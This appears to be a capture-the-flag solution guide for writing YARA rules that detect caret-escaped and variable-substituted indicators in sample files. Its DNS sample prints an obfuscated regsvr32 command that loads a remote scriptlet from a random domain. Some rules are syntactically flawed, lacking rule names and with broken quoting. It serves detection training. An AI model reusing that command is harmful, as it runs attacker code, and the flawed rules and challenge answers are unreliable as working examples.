# Stratification Performation Solution

## Introduction

This guide is designed to serve as a guide to solve this challenge using YARA. In this challenge, players will need to write simple YARA rules to scan three different directories that are present in the provided files. This is to emulate artifacts obtained from a malware investigation. In the provided files there are three folders, [IP](../challenge/IP/), [DNS](../challenge/DNS/) and [CODE](../challenge/CODE/). A YARA rule will need to be created for each of these folders to obtain a file name from each based on the following IOC table. 

 
  | Folder       | IOC                                                        |
  |--------------|------------------------------------------------------------|
  | /IP          | 164.240.138.239                                            |
  | /DNS         | hvOiwETMXmzgAfcGrqlHUCQIyVDBbpoJZdKYPensxruNtaLSjFkW.com   |
  | /CODE        | rCvAfWxe.exe                                               |

Table: Indicators of Compromise

Players will need to observe files created in each directory and determine what obfuscation techniques have been put in place by the attacker to evade automated malware detection engines. Based on observations, players need to craft their rules accordingly, then run the rule file using `yara64.exe` contained in `C:\tools\yara\`. 

Syntax for running rules is: `yara64.exe [RULE NAME] [TARGET DIR]`

## IP address

1. Open a sample file from the /IP directory and notice the following

    ```
    ~  ? � � � � y ? Z � ?  � � Q ` � ? � � � @ ? � ] p / � o � �  ~  ?  � � � l 7
    cmd.exe ping -t 2^^54.106^^.246^^.18^^5 ~  ? � � � � y ? Z � ?  � � Q ` � ? � � � @ ? � ] p / � o � �  ~  ?  � � � l 7**
    ```

2. In the sample there are ^ characters used in this obfuscation technique along with varying buffers on either side of the executable code.

3. Open a second sample

    ```
    9 R   Q E u � � K M � b q 
    } < ? K  � � y � � � ? � � 4 ~  ? � ? � � 5 � m a � < ? c 3 � 2  V U � � � � V ? � ? � ? + ? ? w ? �  
    ( ; � �  � ? O ? � � � � C  �  � o  > � � W & � H Y
    cmd.exe ping -t 82.1^^57.187.19^^5 9 R   Q E u � � K M � b q 
    } < ? K  � � y � � � ? � � 4 ~  ? � ? � � 5 � m a � < ? c 3 � 2  V U � � � � V ? � ? � ? + ? ? w ? �  
    ( ; � �  � ? O ? � � � � C  �  � o  > � � W & � H Y **
    ```

 4. In the second sample we notice that there are buffers of different lengths than the first. We also notice that the carats appear again, this time they correlate with the number 5. Based on this same and the previous one, we can see that the number 5 is preceded by ^^ and the number 6 may be followed by ^^.

 5. Repeat this process two more times until you find that 3=3^^, 6=6^^ and 5=^^5 

 6. Write the following YARA rule and save it as a .yar file

    ```
    rule {
        strings:
        
        $ip= "16^^4.240.13^^8.23^^9"

        condition:

        $ip
    }
    ```

7. Save the rule as a .yar and run the YARA rule from a command line: `yara64.exe iprule.yar D:\var1\IP\`

8. The filename for will appear when the correct rule has been run

## DNS
Next, the player will need to assess DNS for the second part of the challenge and find an obfuscated DNS entry within the /DNS folder. 

1.  This part of the challenge leverages obfuscation by character substitution by substituting the "r" character with the %ALLUSERPROFILE% environment variable. Open another sample from the /DNS folder
    
    ```
    ® Ð ´ g ò H c v & ? ¬ Ì ç Ý d 
    @echo off %ALLUSERSPROFILE:~4,1%egsv%ALLUSERSPROFILE:~4,1%32.exe /s /n /i:http://hvOiwETMXmzgAfcG%ALLUSERSPROFILE:~4,1%qlHUCQIyVDBbpoJZdKYPensx%ALLUSERSPROFILE:~4,1%uNtaLSjFkW.com3  ® Ð ´ g ò H c v & ? ¬ Ì ç Ý d  
    ```

2. In these samples you'll find that the %ALLUSERPROFILE:~4,1% variable is used for the "r" character as evident by the call in the batch file for "regsvr32.exe". Similarly to the previous version, a couple of    samples may need to be analyzed to recognize this pattern. The end result will be a yara rule similar to the following
    
    ```
    rule {
            strings:
        
            $dns = "hvOiwETMXmzgAfcG%ALLUSERSPROFILE:~4,1%qlHUCQIyVDBbpoJZdKYPensx%ALLUSERSPROFILE:~4,1%uNtaLSjFkW.com"

            condition:

            $dns
    }
    ```

3. Save the rule as a .yar and run the YARA rule: `yara64.exe dnsrule.yar D:\var1\DNS\`

4. The filename for will appear when the correct rule has been run

## CODE

1. The final part of the challenge inovlves analyzing samples in the /CODE directory and finding an executable file reference that uses both techniques. In this case "e" will be subtituted with %comspec:~-1% and there are double quotes preceding the characters "r" and "f". This may require contestants review several files to discover the pattern. 

2. This final rule will look like the following: 

    ```
    rule {
            strings:
        
            $code = "r"\"\CvAf"\"\Wx%comspec:~-1%.%comspec:~-1%x%comspec:~-1%"

            condition:

            $code
    }
    ```

3. Save the rule as a .yar and run the YARA rule: `yara64.exe coderule.yar D:\var1\CODE\`

4. The filename for will appear when the correct rule has been run
